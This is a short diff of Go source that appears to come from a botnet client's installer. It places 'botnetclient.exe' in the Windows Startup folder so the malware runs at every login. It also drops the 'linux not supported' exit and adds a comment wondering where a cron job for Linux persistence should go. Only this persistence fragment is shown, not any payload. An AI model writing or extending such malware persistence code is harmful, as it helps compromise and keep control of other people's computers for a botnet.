@@ -91,8 +91,7 @@ func main() {
 	case "windows":
 		clientName = filepath.Join(home, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\botnetclient.exe")
 	case "linux":
-		//fmt.Println("linux not supported YET")
-		//os.Exit(1)
+		// cron job probably isn't done here, but where?
 		clientName = filepath.Join(here, "\\botnetclient.exe")
 	case "default":
 		fmt.Println("OS will not be supported")
